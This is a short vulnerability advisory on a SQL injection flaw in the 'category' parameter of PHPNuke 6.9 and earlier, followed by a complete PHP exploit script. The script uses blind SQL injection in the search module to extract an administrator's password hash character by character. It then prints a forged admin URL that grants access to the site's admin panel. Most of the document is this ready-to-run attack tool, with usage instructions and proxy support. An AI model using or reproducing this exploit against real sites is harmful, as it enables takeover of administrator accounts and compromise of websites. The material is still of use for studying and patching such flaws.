source: http://www.securityfocus.com/bid/9630/info

It has been reported that PHPNuke may prone to a SQL injection vulnerability, due to insufficient sanitization user-supplied input. The problem is reported to exist in the $category variable contained within the 'index.php' page.

PHPNuke versions 6.9 and prior have been reported to be prone to this issue, however other versions may be affected as well.

#!/usr/bin/php -q
PHPnuke 6.x and 5.x fetch author hash by pokleyzz <pokleyzz at scan-associates.net>

<?php
/*
# PHPnuke 6.x and 5.x fetch author hash by pokleyzz <pokleyzz at scan-associates.net>
# 27th December 2003 : 4:54 a.m
#
# bug found by pokleyzz (11th December 2003 ) for HITB 2003 security conference
# (Shame on You!!) 
#
# Requirement:
#	PHP 4.x with curl extension;
#
# Greet: 
#	tynon, sk ,wanvadder,  sir_flyguy, wxyz , tenukboncit, kerengga_kurus , 
#	s0cket370 , b0iler and ...
#
# Happy new year 2004 ...
#
# ---------------------------------------------------------------------------- 
# "TEH TARIK-WARE LICENSE" (Revision 1):
# wrote this file. As long as you retain this notice you 
# can do whatever you want with this stuff. If we meet some day, and you think 
# this stuff is worth it, you can buy me a "teh tarik" in return. 
# ---------------------------------------------------------------------------- 
# (Base on Poul-Henning Kamp Beerware)
#
# Tribute to Search - "kejoraku bersatu.mp3"
#
*/
if (!(function_exists('curl_init'))) {
	echo "cURL extension required\n";
	exit;
}

ini_set("max_execution_time","999999");
 
$matches = "No matches found to your query";

//$url = "http://127.0.0.1/src/phpnuke441a/html";
$charmap = array (48,49,50,51,52,53,54,55,56,57,
		  97,98,99,100,101,102,
		  103,104,105,
		  106,107,108,109,110,111,112,113,
		  114,115,116,117,118,119,120,121,122
		  );
		  
if($argv[1] && $argv[2]){
	
	$url = $argv[1];
	$author = $argv[2];
	if ($argv[3])
		$proxy = $argv[3]; 
}
else {
	echo "Usage: ".$argv[0]." <URL> <aid> [proxy]\n\n";
	echo "\tURL\t URL to phpnuke site (ex: http://127.0.0.1/html)\n";
	echo "\taid\t author id to get  (ex: god)\n";
	echo "\tproxy\t optional proxy url  (ex: http://10.10.10.10:8080)\n"; 
	exit;
}
$search = "/modules.php?name=Search";
echo "Take your time for Teh Tarik... please wait ...\n\n";
echo "Result:\n";
echo "\t$author:";
$admin = $author.":";
$i =0;
$tmp = "char(";
while ($i < strlen($author)){
	$tmp .= ord(substr($author,$i,1));
	$i++;
	if ($i < strlen($author)){
		$tmp .= ",";
	} 
}
$tmp .= ")";
$author=$tmp;

for($i= 1;$i< 33;$i++){ 
	foreach ($charmap as $char){
		echo chr($char);
		$postvar = "query=%25&category=99999+or+a.aid=$author+and+ascii(substring(a.pwd,$i,1))=$char";
		$ch = curl_init();
		if ($proxy){
			curl_setopt($ch, CURLOPT_PROXY,$proxy); 
		}
		curl_setopt($ch, CURLOPT_URL,$url.$search);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postvar);
		$res=curl_exec ($ch);
		curl_close ($ch);
		if (!(ereg($matches,$res))){
			//echo chr($char);
			$admin .= chr($char);
			break 1;
		}
		else {
			echo chr(8);
		}
		
		if ($char ==103){
			echo "\n\n\tNot Vulnerable or Something wrong occur ...\n";
			exit;
		}
		
	}
}
$admin .= "::";
echo "\n\nAdmin URL:\n";
echo "\t$url/admin.php?admin=".ereg_replace("=","%3d",base64_encode($admin));
echo "\n";
echo "\n\nEnjoy your self and Happy New Year 2004....";
?>
